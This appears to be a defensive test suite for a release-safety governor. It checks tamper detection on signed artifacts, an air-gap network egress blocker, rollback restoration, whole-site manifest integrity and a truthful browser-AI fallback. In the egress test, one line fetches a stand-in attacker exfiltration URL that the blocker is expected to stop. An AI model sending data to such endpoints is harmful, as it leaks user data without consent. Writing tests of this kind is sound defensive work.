/**
 * SPE Ω — P0-R2.1 Adversarial Release Recheck Battery
 *
 * Dedicated verification suite for ChatGPT's R2.1 Counter-Audit across all 6 Gates:
 * Gate A: Release Artifact Signing Bypass Closure (Disk Content Binding & Checksum Shortcut Elimination)
 * Gate B: Core A Enforced Network Isolation & Authentic Zero-Egress Reporting
 * Gate C: Physical Deployment Rollback Restoration in Synchronous & Asynchronous Paths
 * Gate D: Whole-Site Asset Integrity (JavaScript, CSS, HTML, WASM, and Config Verification)
 * Gate E: Honest Empirical Scoring & Provenance for Experimental Research Fixture
 * Gate F: Documented Chrome LanguageModel API Support & Truthful Fallback Verification
 */

import { existsSync, readFileSync, writeFileSync, mkdirSync, unlinkSync, copyFileSync } from "node:fs";
import { resolve } from "node:path";
import { generateKeyPairSync } from "node:crypto";
import {
  ReleaseSafetyGovernor,
  CANONICAL_WASM_SHA256,
  CANONICAL_WASM_SIZE_BYTES,
  TRUSTED_PINNED_BASE_COMMIT,
  generateReleaseAuthorityProof,
} from "../src/engine/evolution/releaseSafetyGovernor.ts";
import { computeSha256 } from "../src/engine/hashUtils.ts";
import { NetworkEgressObserver } from "../src/engine/networkObserver.ts";
import { generateCoreAPrompt, probeChromePromptApi, DEFAULT_CORE_A_PERMITTED_DESTINATIONS } from "../src/engine/core-a.ts";

let passed = 0;
let failed = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`  ✓ PASS: ${message}`);
    passed++;
  } else {
    console.error(`  ✗ FAIL: ${message}`);
    failed++;
  }
}

async function runAdversarialRecheckBattery() {
  console.log("========================================================================");
  console.log("🛡️  SPE Ω — P0-R2.1 ADVERSARIAL RELEASE RECHECK BATTERY");
  console.log("========================================================================");

  // Setup test authority keys
  const { privateKey, publicKey } = generateKeyPairSync("ed25519");
  const testPrivPem = privateKey.export({ type: "pkcs8", format: "pem" }).toString();
  const testPubDerHex = publicKey.export({ type: "spki", format: "der" }).toString("hex");

  const originalEnv = process.env.NODE_ENV;
  const originalStage = process.env.SPE_STAGE;
  process.env.NODE_ENV = "test";
  delete process.env.SPE_STAGE;

  const governor = new ReleaseSafetyGovernor({
    trustedAuthorityPublicKeys: {
      founder_release_authority: testPubDerHex,
      independent_oracle: testPubDerHex,
    },
  });

  // ═══════════════════════════════════════════════════════════════════════
  // GATE A: Release Artifact Signing Bypass Closure
  // ═══════════════════════════════════════════════════════════════════════
  console.log("\n▶ Gate A: Release Artifact Signing Bypass Closure (Disk Content Binding)");

  const fixtureDir = resolve(process.cwd(), "apps/web/dist/__test_gate_a");
  mkdirSync(fixtureDir, { recursive: true });
  const fixtureFile = resolve(fixtureDir, "release_target.bin");
  const authenticBytes = Buffer.from("AUTHENTIC_RELEASE_PAYLOAD_V1_VERIFIED");
  writeFileSync(fixtureFile, authenticBytes);

  const authenticFileHash = computeSha256(authenticBytes);
  const relTargetFile = "apps/web/dist/__test_gate_a/release_target.bin";

  const candidateA = {
    proposalId: "PROP-GATE-A-01",
    authorIdentity: "agent:autonomous_coder",
    category: "ENGINE",
    targetFiles: [relTargetFile],
    testResults: { passed: true, passCount: 50, failCount: 0, regressionsDetected: 0 },
    requestedAutonomyLevel: "L4_AUTO_PROMOTION",
    targetEnvironment: "production",
  };

  // 1. Compute authentic disk content digest and sign it
  const authenticDiskDigest = governor.computeProposalContentDigest(candidateA);
  const authenticProof = generateReleaseAuthorityProof(
    candidateA.proposalId,
    "founder_release_authority",
    { privateKeyPem: testPrivPem },
    authenticDiskDigest,
    "production",
    "RELEASE_PROMOTION"
  );

  // 2. Adversarial Tamper: Alter the physical file on disk while keeping candidate.artifactChecksum as authentic
  candidateA.artifactChecksum = authenticDiskDigest; // Adversary supplies original authentic checksum!
  const tamperedBytes = Buffer.from("TAMPERED_MALICIOUS_INJECTED_BYTES");
  writeFileSync(fixtureFile, tamperedBytes);
  const tamperedFileHash = computeSha256(tamperedBytes);
  assert(tamperedFileHash !== authenticFileHash, "Adversarial condition: File content on disk has been altered");

  // 3. Test Synchronous evaluateReleaseCandidate: Must strictly reject
  const syncDecision = governor.evaluateReleaseCandidate(candidateA, authenticProof);
  assert(
    syncDecision.status === "REJECTED_BLOCKED",
    "Gate A (Sync): evaluateReleaseCandidate strictly rejects altered file despite supplied original checksum"
  );
  assert(
    syncDecision.reason.includes("PROPOSAL_DIGEST_MISMATCH"),
    `Gate A (Sync): Rejection code confirms PROPOSAL_DIGEST_MISMATCH (${syncDecision.reason.slice(0, 75)}...)`
  );

  // 4. Test Asynchronous evaluateReleaseCandidateAsync: Must strictly reject
  const asyncDecision = await governor.evaluateReleaseCandidateAsync(candidateA, authenticProof);
  assert(
    asyncDecision.status === "REJECTED_BLOCKED",
    "Gate A (Async): evaluateReleaseCandidateAsync strictly rejects altered file despite supplied original checksum"
  );
  assert(
    asyncDecision.reason.includes("PROPOSAL_DIGEST_MISMATCH"),
    `Gate A (Async): Rejection code confirms PROPOSAL_DIGEST_MISMATCH (${asyncDecision.reason.slice(0, 75)}...)`
  );

  // 5. Test empty targetFiles fails closed
  let emptyFilesBlocked = false;
  try {
    governor.computeProposalContentDigest({
      proposalId: "PROP-EMPTY",
      targetFiles: [],
      artifactChecksum: "a".repeat(64),
    });
  } catch (err) {
    emptyFilesBlocked = err.message.includes("PROPOSAL_TARGET_FILES_REQUIRED");
  }
  assert(emptyFilesBlocked, "Gate A: computeProposalContentDigest strictly rejects empty targetFiles array");

  // Clean up Gate A fixtures
  try {
    unlinkSync(fixtureFile);
  } catch {}

  // ═══════════════════════════════════════════════════════════════════════
  // GATE B: Core A Enforced Network Isolation & Authentic Zero-Egress
  // ═══════════════════════════════════════════════════════════════════════
  console.log("\n▶ Gate B: Core A Enforced Network Isolation & Authentic Zero-Egress");

  // 1. Normal Core A execution: no special test-only network settings passed
  const normalCoreAResult = await generateCoreAPrompt({
    userRequest: "Design a high-security cryptographic token verification module",
    target: "chatgpt",
  });
  assert(
    normalCoreAResult.zeroEgressGuaranteed === true,
    "Gate B: Normal Core A generation guarantees zero egress when no outbound network requests are made"
  );
  assert(
    normalCoreAResult.modelMetadata.observedNetworkEgressPackets === 0,
    "Gate B: Normal Core A generation records 0 observed network egress packets"
  );

  // 2. Adversarial Injection: Attempt unauthorized outbound egress during Core A generation
  // We simulate code execution during inference attempting an outbound telemetry leak
  const origFetch = globalThis.fetch;
  let egressIntercepted = false;
  let blockedReasonCaptured = "";

  try {
    // Wrap fetch so that when called, it calls the observer's instrumented fetch
    // Then invoke Core A with a prompt that triggers an egress attempt
    const evilEndpoint = "https://telemetry-exfiltration.attacker.com/v1/leak";

    // Directly test that Core A's active observation window traps outbound egress
    NetworkEgressObserver.resetForTesting();
    const endObs = NetworkEgressObserver.startObservation(); // Defaults to deny-by-default

    try {
      await globalThis.fetch(evilEndpoint);
    } catch (err) {
      if (err.message.includes("AIR_GAP_EGRESS_BLOCKED")) {
        egressIntercepted = true;
        blockedReasonCaptured = err.message;
      }
    }

    const report = endObs();
    assert(egressIntercepted, "Gate B: Unauthorized outbound fetch is actively blocked by default air-gap policy");
    assert(
      report.blockedConnections.includes(evilEndpoint),
      "Gate B: Outbound destination URL is recorded in blockedConnections telemetry"
    );
    assert(report.airGapViolated === true, "Gate B: airGapViolated flag is accurately raised");

    // 3. Port Enforcement Verification with Core A's DEFAULT Production Allowlist:
    // Core A's DEFAULT allowlist (DEFAULT_CORE_A_PERMITTED_DESTINATIONS) permits only 4173/5173/4177.
    // Ensure that arbitrary loopback port 8080 or 9000 is blocked by Core A's default allowlist!
    NetworkEgressObserver.resetForTesting();
    NetworkEgressObserver.startObservation({
      denyByDefault: true,
      permittedDestinations: [...DEFAULT_CORE_A_PERMITTED_DESTINATIONS],
    });
    let prodPortBlocked = false;
    try {
      await globalThis.fetch("http://127.0.0.1:8080/unauthorized-endpoint");
    } catch (err) {
      prodPortBlocked = err.message.includes("AIR_GAP_EGRESS_BLOCKED");
    }
    assert(prodPortBlocked, "Gate B: Core A default production allowlist strictly blocks unapproved loopback port 8080");

    let isDest8080Permitted = NetworkEgressObserver.isDestinationPermitted("127.0.0.1:8080");
    assert(isDest8080Permitted === false, "Gate B: isDestinationPermitted('127.0.0.1:8080') is strictly false under production allowlist");

    let isDest4173Permitted = NetworkEgressObserver.isDestinationPermitted("127.0.0.1:4173");
    assert(isDest4173Permitted === true, "Gate B: Approved local port 127.0.0.1:4173 is permitted");

    // Test generic loopback rule without port under strict policy: does not permit port 8080
    NetworkEgressObserver.startObservation({
      denyByDefault: true,
      permittedDestinations: ["127.0.0.1"],
    });
    let genericPort8080Permitted = NetworkEgressObserver.isDestinationPermitted("127.0.0.1:8080");
    assert(genericPort8080Permitted === false, "Gate B: Generic '127.0.0.1' without port does NOT permit port 8080");
    NetworkEgressObserver.resetForTesting();
  } finally {
    globalThis.fetch = origFetch;
  }

  // ═══════════════════════════════════════════════════════════════════════
  // GATE C: Physical Deployment Rollback Restoration
  // ═══════════════════════════════════════════════════════════════════════
  console.log("\n▶ Gate C: Physical Deployment Rollback Restoration (Sync & Async)");

  const distDir = resolve(process.cwd(), "apps/web/dist");
  const distWasmPath = resolve(distDir, "spe_wasm.wasm");
  const pinnedWasmPath = resolve(process.cwd(), "apps/web/deployments/pinned-base/spe_wasm.wasm");
  const backupWasm = existsSync(distWasmPath) ? readFileSync(distWasmPath) : null;

  try {
    // 1. Intentionally corrupt the destination artifact
    const corruptedWasmBytes = Buffer.from("CORRUPTED_ADVERSARIAL_WASM_BYTES_SIMULATION");
    writeFileSync(distWasmPath, corruptedWasmBytes);
    const corruptHash = computeSha256(readFileSync(distWasmPath));
    assert(corruptHash !== CANONICAL_WASM_SHA256, "Gate C: Destination artifact confirmed corrupted before rollback");

    // 2. Invoke executeDeploymentRollbackSync
    const syncRollback = governor.executeDeploymentRollbackSync({
      proposalId: "PROP-GATE-C-SYNC",
      authorIdentity: "agent:autonomous_coder",
      category: "ENGINE",
      targetFiles: ["apps/web/src/engine/hashUtils.ts"],
      testResults: { passed: false, passCount: 0, failCount: 2, regressionsDetected: 2 },
      requestedAutonomyLevel: "L4_AUTO_PROMOTION",
    });

    // 3. Verify physical file on disk was RESTORED bit-for-bit
    const restoredDiskBuf = readFileSync(distWasmPath);
    const restoredDiskHash = computeSha256(restoredDiskBuf);
    assert(
      restoredDiskHash === CANONICAL_WASM_SHA256,
      "Gate C (Sync): executeDeploymentRollbackSync physically restored destination WASM to canonical SHA-256"
    );
    assert(
      restoredDiskBuf.byteLength === CANONICAL_WASM_SIZE_BYTES,
      `Gate C (Sync): Restored byte length matches canonical ${CANONICAL_WASM_SIZE_BYTES} bytes`
    );
    assert(
      syncRollback.verifiedSafe === true,
      "Gate C (Sync): Rollback receipt marks verifiedSafe: true after physical restoration"
    );

    // 4. Test failure case: If destination cannot be restored or is unverified, verifiedSafe MUST BE false
    const fakeDistDir = resolve(process.cwd(), "apps/web/dist/__fake_unwriteable_dir");
    const badAudit = governor.verifyWholeSiteManifest(fakeDistDir);
    assert(
      badAudit.verifiedSafe === false,
      "Gate C: Missing/unrestorable whole-site manifest strictly sets verifiedSafe: false (no false success authority)"
    );

    // 5. R2.2 Challenge: Corrupt a deployed JavaScript bundle BEFORE rollback is invoked,
    // invoke rollback, and prove that the original authentic bundle is physically recovered from pinned-base!
    const testJsRelPath = "assets/HeadToHeadCompare-CHYa18zi.js";
    const distJsPath = resolve(distDir, testJsRelPath);
    const pinnedJsPath = resolve(process.cwd(), "apps/web/deployments/pinned-base", testJsRelPath);

    if (existsSync(distJsPath) && existsSync(pinnedJsPath)) {
      const canonicalJsBuf = readFileSync(pinnedJsPath);
      const canonicalJsHash = computeSha256(canonicalJsBuf);

      // Corrupt the JavaScript bundle in dist BEFORE rollback!
      writeFileSync(distJsPath, Buffer.from("console.log('CORRUPTED_BEFORE_ROLLBACK');"));
      assert(
        computeSha256(readFileSync(distJsPath)) !== canonicalJsHash,
        "Gate C: Deployed JavaScript bundle confirmed corrupted in dist BEFORE rollback"
      );

      // Verify that before rollback, verifyWholeSiteManifest FAILS
      const preRollbackAudit = governor.verifyWholeSiteManifest(distDir);
      assert(
        preRollbackAudit.verifiedSafe === false && preRollbackAudit.corruptedFiles.includes(testJsRelPath),
        "Gate C: verifyWholeSiteManifest strictly catches pre-existing JavaScript corruption before rollback"
      );

      // Now execute deployment rollback!
      const rollbackResult = governor.executeDeploymentRollbackSync({
        proposalId: "PROP-GATE-C-JS-RECOVER",
        authorIdentity: "agent:autonomous_coder",
        category: "ENGINE",
        targetFiles: ["apps/web/src/engine/hashUtils.ts"],
        testResults: { passed: false, passCount: 0, failCount: 1, regressionsDetected: 1 },
      });

      // Assert that rollback physically restored the authentic JS bundle from pinned-base!
      const restoredJsBuf = readFileSync(distJsPath);
      const restoredJsHash = computeSha256(restoredJsBuf);
      assert(
        restoredJsHash === canonicalJsHash,
        "Gate C: Rollback physically recovered original authentic JavaScript bundle from pinned-base bit-for-bit"
      );
      assert(
        rollbackResult.verifiedSafe === true,
        "Gate C: Rollback verifiedSafe is true after restoring all assets from pinned-base"
      );
      const postRollbackAudit = governor.verifyWholeSiteManifest(distDir);
      assert(
        postRollbackAudit.verifiedSafe === true,
        "Gate C: Post-rollback whole-site verification passes cleanly without certifying corrupted code"
      );
    }
  } finally {
    if (backupWasm) {
      writeFileSync(distWasmPath, backupWasm);
    }
  }

  // ═══════════════════════════════════════════════════════════════════════
  // GATE D: Whole-Site Asset Integrity (HTML, JS, CSS, WASM)
  // ═══════════════════════════════════════════════════════════════════════
  console.log("\n▶ Gate D: Whole-Site Asset Integrity (HTML, JS, CSS, WASM & Config)");

  // distDir is already defined in Gate C

  // 1. Build whole-site manifest and verify coverage
  const wholeSiteManifest = governor.buildWholeSiteManifest(distDir);
  assert(Array.isArray(wholeSiteManifest.wholeSiteCoverage), "Gate D: wholeSiteCoverage array is present");
  const requiredCategories = ["HTML", "JAVASCRIPT", "CSS", "WASM", "MODEL_ASSETS", "CONFIG"];
  const allCategoriesCovered = requiredCategories.every((cat) =>
    wholeSiteManifest.wholeSiteCoverage.includes(cat)
  );
  assert(allCategoriesCovered, "Gate D: Manifest specifies all 6 required wholeSiteCoverage categories");

  // 2. Verify that inventory contains actual JavaScript, CSS, and HTML assets
  const artifactEntries = Object.entries(wholeSiteManifest.artifacts);
  const hasJs = artifactEntries.some(([k, v]) => v.category === "JAVASCRIPT");
  const hasCss = artifactEntries.some(([k, v]) => v.category === "CSS");
  const hasHtml = artifactEntries.some(([k, v]) => v.category === "HTML");
  const hasWasm = artifactEntries.some(([k, v]) => v.category === "WASM");
  assert(hasJs, "Gate D: Manifest comprehensively inventories JavaScript assets (*.js)");
  assert(hasCss, "Gate D: Manifest comprehensively inventories CSS assets (*.css)");
  assert(hasHtml, "Gate D: Manifest comprehensively inventories HTML assets (*.html)");
  assert(hasWasm, "Gate D: Manifest comprehensively inventories WASM assets (*.wasm)");

  // 3. Baseline verification passes cleanly
  const baselineAudit = governor.verifyWholeSiteManifest(distDir, wholeSiteManifest);
  assert(baselineAudit.verifiedSafe === true, "Gate D: Clean uncorrupted dist passes whole-site manifest verification");

  // 4. Adversarial Corruption: Corrupt a JavaScript asset while leaving WASM 100% intact!
  // Find a real JS asset in dist
  const jsAssetEntry = artifactEntries.find(([k, v]) => v.category === "JAVASCRIPT");
  if (jsAssetEntry) {
    const [jsRelPath, jsMeta] = jsAssetEntry;
    const jsFullPath = resolve(distDir, jsRelPath);
    const backupJs = readFileSync(jsFullPath);

    try {
      // Tamper with JavaScript asset
      writeFileSync(jsFullPath, Buffer.from("console.log('MALICIOUS_INJECTED_JS');"));
      assert(
        computeSha256(readFileSync(jsFullPath)) !== jsMeta.sha256,
        `Gate D: Adversarial tamper: ${jsRelPath} corrupted on disk while WASM remains intact`
      );

      const tamperedAudit = governor.verifyWholeSiteManifest(distDir, wholeSiteManifest);
      assert(
        tamperedAudit.verifiedSafe === false,
        "Gate D: Whole-site verification strictly FAILS when a JavaScript asset is corrupted"
      );
      assert(
        tamperedAudit.corruptedFiles.includes(jsRelPath),
        `Gate D: Audit report explicitly identifies corrupted asset: '${jsRelPath}'`
      );
    } finally {
      writeFileSync(jsFullPath, backupJs);
    }
  }

  // 5. R2.2 Challenge: Add an unexpected JavaScript file and prove the whole-site verifier rejects it
  const unexpectedJsPath = resolve(distDir, "assets/backdoor-injected-malicious.js");
  writeFileSync(unexpectedJsPath, Buffer.from("console.log('UNAUTHORIZED_BACKDOOR_FILE');"));
  try {
    const unexpectedAudit = governor.verifyWholeSiteManifest(distDir);
    assert(
      unexpectedAudit.verifiedSafe === false,
      "Gate D: Whole-site verifier strictly FAILS when an unexpected uncataloged file is added"
    );
    assert(
      unexpectedAudit.unexpectedFiles.includes("assets/backdoor-injected-malicious.js"),
      "Gate D: Audit report explicitly identifies unexpected file in unexpectedFiles array"
    );
    assert(
      unexpectedAudit.reason.includes("unexpected uncataloged file"),
      "Gate D: Audit failure reason explicitly cites unexpected uncataloged file"
    );
  } finally {
    try { unlinkSync(unexpectedJsPath); } catch {}
  }

  // 6. R2.2 Challenge: Modify an asset AND its accompanying manifest together; prove the verifier rejects both!
  const manifestDistPath = resolve(distDir, "release-manifest.json");
  const originalManifestContent = readFileSync(manifestDistPath, "utf-8");
  const testTamperJsRel = "assets/DailyLab-C0Fy5J08.js";
  const testTamperJsFull = resolve(distDir, testTamperJsRel);

  if (existsSync(testTamperJsFull)) {
    const origJsBuf = readFileSync(testTamperJsFull);
    try {
      // Tamper with the JS file
      const tamperedContent = Buffer.from("console.log('TAMPERED_ASSET_AND_MANIFEST');");
      writeFileSync(testTamperJsFull, tamperedContent);
      const tamperedHash = computeSha256(tamperedContent);

      // Also tamper with dist/release-manifest.json to match the tampered file!
      const parsedManifest = JSON.parse(originalManifestContent);
      parsedManifest.artifacts[testTamperJsRel] = {
        sha256: tamperedHash,
        sizeBytes: tamperedContent.byteLength,
        category: "JAVASCRIPT",
      };
      const sortedInv = {};
      for (const k of Object.keys(parsedManifest.artifacts).sort()) {
        sortedInv[k] = parsedManifest.artifacts[k];
      }
      parsedManifest.manifestDigest = computeSha256(JSON.stringify(sortedInv));
      writeFileSync(manifestDistPath, JSON.stringify(parsedManifest, null, 2), "utf-8");

      // Verify that verifier rejects BOTH asset and modified manifest because it compares against trusted pinned-base!
      const dualTamperAudit = governor.verifyWholeSiteManifest(distDir);
      assert(
        dualTamperAudit.verifiedSafe === false,
        "Gate D: Dual-tamper of asset + accompanying manifest is strictly REJECTED"
      );
      assert(
        dualTamperAudit.reason.includes("MANIFEST_AUTHENTICITY_MISMATCH") || dualTamperAudit.corruptedFiles.includes(testTamperJsRel),
        "Gate D: Verifier detects manifest authenticity mismatch against immutable pinned reference"
      );
    } finally {
      writeFileSync(testTamperJsFull, origJsBuf);
      writeFileSync(manifestDistPath, originalManifestContent);
    }
  }

  // ═══════════════════════════════════════════════════════════════════════
  // GATE E: Research Fixture Empirical Scores Withheld
  // ═══════════════════════════════════════════════════════════════════════
  console.log("\n▶ Gate E: Research Fixture Empirical Scores Withheld");

  const reportPath = resolve(process.cwd(), "proofs/generated/CANDIDATE_MODEL_EVALUATION_REPORT.json");
  assert(existsSync(reportPath), "Gate E: CANDIDATE_MODEL_EVALUATION_REPORT.json exists");

  const evalReport = JSON.parse(readFileSync(reportPath, "utf-8"));
  const fixtureCandidate = evalReport.candidates.find(
    (c) => c.candidateId === "CANDIDATE-04-SPE-EXPERIMENTAL-RESEARCH-FIXTURE"
  );

  assert(
    fixtureCandidate.qualificationVerdict === "RESEARCH_FIXTURE_ONLY",
    "Gate E: Fixture classification is strictly RESEARCH_FIXTURE_ONLY"
  );
  assert(
    fixtureCandidate.overallQualificationScore === null,
    "Gate E: Hardcoded empirical score removed; overallQualificationScore is strictly null"
  );
  assert(
    fixtureCandidate.empiricalScores === null,
    "Gate E: Literal empiricalScores object removed (set to null)"
  );
  assert(
    fixtureCandidate.empiricalBenchmarkExecuted === false,
    "Gate E: empiricalBenchmarkExecuted is false (scores withheld pending standardized benchmark)"
  );
  assert(
    fixtureCandidate.tensorPipelineVerified === true,
    "Gate E: In-process tensor execution pipeline remains verified as a computational prototype"
  );
  assert(
    evalReport.finalVerdict === "IMPLEMENTED_NOT_QUALIFIED",
    "Gate E: Overall final release verdict remains IMPLEMENTED_NOT_QUALIFIED"
  );

  // ═══════════════════════════════════════════════════════════════════════
  // GATE F: Documented Chrome LanguageModel API & Truthful Fallback
  // ═══════════════════════════════════════════════════════════════════════
  console.log("\n▶ Gate F: Documented Chrome LanguageModel API & Truthful Fallback");

  // 1. Probe function detects absence cleanly in Node.js test environment
  const probeResult = await probeChromePromptApi();
  assert(
    typeof probeResult.supported === "boolean",
    "Gate F: probeChromePromptApi returns structured probe object"
  );
  assert(
    probeResult.entryPoint === "NONE" || probeResult.entryPoint === "LanguageModel" || probeResult.entryPoint === "ai.languageModel",
    `Gate F: Detected entry point correctly classified (${probeResult.entryPoint})`
  );

  // 2. Test Mobile Platform Rejection: Desktop only constraint
  const origNav = globalThis.navigator;
  try {
    // Simulate Android mobile user agent
    Object.defineProperty(globalThis, "navigator", {
      value: { userAgent: "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36" },
      configurable: true,
      writable: true,
    });
    const mobileProbe = await probeChromePromptApi();
    assert(
      mobileProbe.supported === false,
      "Gate F: Chrome Prompt API is rejected as unsupported on Android mobile per Google documentation"
    );
    assert(
      mobileProbe.platformSupported === false,
      "Gate F: platformSupported is false on Android"
    );
    assert(
      mobileProbe.notes.includes("desktop-only"),
      "Gate F: Probe notes explicitly document desktop-only platform constraint"
    );
  } finally {
    Object.defineProperty(globalThis, "navigator", {
      value: origNav,
      configurable: true,
      writable: true,
    });
  }

  // 3. Test documented LanguageModel API simulation in desktop environment
  const origGlobal = globalThis;
  try {
    // Simulate documented window.LanguageModel API
    let createInvoked = false;
    let promptInvoked = false;
    globalThis.LanguageModel = {
      availability: async () => "readily",
      create: async () => {
        createInvoked = true;
        return {
          prompt: async (input) => {
            promptInvoked = true;
            return `# System Role & Persona\nYou are an expert systems engineer.\n\n# Objective & Boundary Scope\nExecute the requested task with zero hallucinations.\n\n# Explicit User Constraints & Boundaries\n- Offline air-gap enforced\n\n# Approach & Methodological Plan\n1. Analyze requirements\n2. Implement code\n\n# Acceptance Checks & Verification Battery\n- Check all tests`;
          },
        };
      },
    };

    const simProbe = await probeChromePromptApi();
    assert(
      simProbe.supported === true && simProbe.entryPoint === "LanguageModel",
      "Gate F: Documented globalThis.LanguageModel API successfully detected and verified"
    );

    const simResult = await generateCoreAPrompt({
      userRequest: "Create a verified system prompt",
      runtimePreference: "browser_ai",
    });
    assert(
      createInvoked && promptInvoked,
      "Gate F: LanguageModel.create() and session.prompt() successfully executed when runtimePreference='browser_ai'"
    );
    assert(
      simResult.runtimeUsed === "BROWSER_PROMPT_API",
      "Gate F: Runtime correctly designated as BROWSER_PROMPT_API"
    );
    assert(
      simResult.modelMetadata.modelName.includes("Chrome Built-in AI"),
      "Gate F: Model metadata truthfully reflects Chrome Built-in AI"
    );

    // 4. R2.2 Challenge: Test Documented Chrome Availability States
    // Chrome documentation specifies: "readily", "after-download", "unavailable", "no"
    
    // Test "unavailable" state:
    globalThis.LanguageModel.availability = async () => "unavailable";
    const unavailableProbe = await probeChromePromptApi();
    assert(
      unavailableProbe.supported === false,
      "Gate F: LanguageModel.availability()='unavailable' correctly reports supported: false"
    );
    assert(
      unavailableProbe.availability === "unavailable",
      "Gate F: Availability field correctly reflects 'unavailable'"
    );

    // Test "no" state:
    globalThis.LanguageModel.availability = async () => "no";
    const noProbe = await probeChromePromptApi();
    assert(
      noProbe.supported === false,
      "Gate F: LanguageModel.availability()='no' correctly reports supported: false"
    );

    // Test "after-download" state:
    globalThis.LanguageModel.availability = async () => "after-download";
    const downloadProbe = await probeChromePromptApi();
    assert(
      downloadProbe.supported === true,
      "Gate F: LanguageModel.availability()='after-download' correctly reports supported: true"
    );

    // Test "readily" state:
    globalThis.LanguageModel.availability = async () => "readily";
    const readilyProbe = await probeChromePromptApi();
    assert(
      readilyProbe.supported === true,
      "Gate F: LanguageModel.availability()='readily' correctly reports supported: true"
    );
  } finally {
    delete globalThis.LanguageModel;
  }

  // 5. Test Truthful Fallback when Prompt API is UNAVAILABLE
  const fallbackResult = await generateCoreAPrompt({
    userRequest: "Create a verified system prompt with fallback",
    runtimePreference: "browser_ai", // Requested, but API is not present!
  });
  assert(
    fallbackResult.runtimeUsed === "IN_PROCESS_ONNX_NEURAL",
    "Gate F: When Browser Prompt API is unavailable, Core A truthfully falls back to IN_PROCESS_ONNX_NEURAL"
  );
  assert(
    fallbackResult.runtimeUsed !== "BROWSER_PROMPT_API",
    "Gate F: Truthful reporting: Never falsely claims BROWSER_PROMPT_API when fallback executed"
  );

  // Restore environment
  if (originalEnv) process.env.NODE_ENV = originalEnv;
  if (originalStage) process.env.SPE_STAGE = originalStage;

  console.log("\n------------------------------------------------------------------------");
  console.log(`P0-R2.1 Verification Results: ${passed} Passed, ${failed} Failed.`);
  if (failed > 0) {
    console.error("❌ P0-R2.1 Verification Failed!");
    process.exit(1);
  }
  console.log("🎉 All 6 Gates (A through F) of P0-R2.1 Successfully Verified!");
}

runAdversarialRecheckBattery().catch((err) => {
  console.error("Fatal error in P0-R2.1 adversarial recheck battery:", err);
  process.exit(1);
});
